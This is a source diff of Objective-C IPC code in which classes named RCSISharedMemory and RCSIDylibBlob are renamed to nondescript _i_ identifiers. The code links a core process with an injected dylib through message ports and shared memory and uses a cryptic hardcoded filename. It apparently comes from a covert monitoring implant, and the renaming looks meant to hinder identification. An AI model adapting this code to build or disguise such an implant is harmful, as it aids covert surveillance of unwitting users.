@@ -31,7 +31,7 @@ typedef struct _shMemNewProc
   int pid;
 } shMemNewProc;
 
-static RCSISharedMemory *sharedRCSIIpc = nil;
+static _i_SharedMemory *sharedInstance = nil;
 
 #pragma mark -
 #pragma mark Core callback
@@ -51,7 +51,7 @@ CFDataRef coreMessagesHandler(CFMessagePortRef local,
   
   CFRetain(data);
   
-  RCSISharedMemory *self       = (RCSISharedMemory *)info;
+  _i_SharedMemory *self       = (_i_SharedMemory *)info;
   shMemNewProc     *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);
 
   if (msgid == NEWPROCMAGIC && 
@@ -111,7 +111,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
   
   CFRetain(data);
   
-  RCSISharedMemory *self = (RCSISharedMemory *)info;
+  _i_SharedMemory *self = (_i_SharedMemory *)info;
   
   blob_t *blob = (blob_t*) CFDataGetBytePtr(data);
   NSData *blbData = nil;
@@ -119,7 +119,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
   if (blob->size > 0)
     blbData = [NSData dataWithBytes:(void*)blob->blob length:blob->size];
   
-  RCSIDylibBlob *blb = [[RCSIDylibBlob alloc] initWithType: blob->type 
+  _i_DylibBlob *blb = [[_i_DylibBlob alloc] initWithType: blob->type 
                                                     status: blob->status 
                                                 attributes: blob->attributes 
                                                       blob: blbData
@@ -138,7 +138,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
 #pragma mark SharedMemory implementation
 #pragma mark -
 
-@implementation RCSISharedMemory
+@implementation _i_SharedMemory
 
 @synthesize mFilename;
 @synthesize mSharedMemory;
@@ -149,27 +149,27 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
 #pragma mark Singleton methods
 #pragma mark -
 
-+ (RCSISharedMemory *)sharedInstance
++ (_i_SharedMemory *)sharedInstance
 {
   @synchronized(self)
   {
-  if (sharedRCSIIpc == nil)
+  if (sharedInstance == nil)
     {
       [[self alloc] init];
     }
   }
   
-  return sharedRCSIIpc;
+  return sharedInstance;
 }
 
 + (id)allocWithZone: (NSZone *)aZone
 {
   @synchronized(self)
   {
-  if (sharedRCSIIpc == nil)
+  if (sharedInstance == nil)
     {
-      sharedRCSIIpc = [super allocWithZone: aZone];
-      return sharedRCSIIpc;
+      sharedInstance = [super allocWithZone: aZone];
+      return sharedInstance;
     }
   }
   
@@ -187,7 +187,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
   
   @synchronized(myClass)
   {
-    if (sharedRCSIIpc != nil)
+    if (sharedInstance != nil)
       {
         self = [super init];
         
@@ -203,11 +203,11 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
             mFilename         = @"kj489y92";
           }
         
-        sharedRCSIIpc = self;
+        sharedInstance = self;
       }
   }
   
-  return sharedRCSIIpc;
+  return sharedInstance;
 }
 
 - (id)retain
@@ -347,7 +347,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
         
         for (int i=count-1; i >= 0; i--) 
           {
-            RCSIDylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
+            _i_DylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
             
             if ([blb status] == 1)
               {
@@ -364,7 +364,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
 
 - (id)getBlob
 {
-  RCSIDylibBlob *retBlb = nil;
+  _i_DylibBlob *retBlb = nil;
   
   @synchronized(self)
   {
@@ -374,7 +374,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
       
         for (int i=count-1; i >= 0; i--) 
           {
-            RCSIDylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
+            _i_DylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
           
             if ([blb status] == 1)
               {
@@ -390,7 +390,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
   return retBlb;
 }
 
-- (void)putBlob:(RCSIDylibBlob*)aBlob
+- (void)putBlob:(_i_DylibBlob*)aBlob
 {
   BOOL found = FALSE;
   
@@ -398,7 +398,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
   {
     for(int i=0; i < [mDylibBlobQueue count]; i++)
       {
-        RCSIDylibBlob *currBlob = [mDylibBlobQueue objectAtIndex:i];
+        _i_DylibBlob *currBlob = [mDylibBlobQueue objectAtIndex:i];
       
         if ([currBlob type] == [aBlob type])
           {
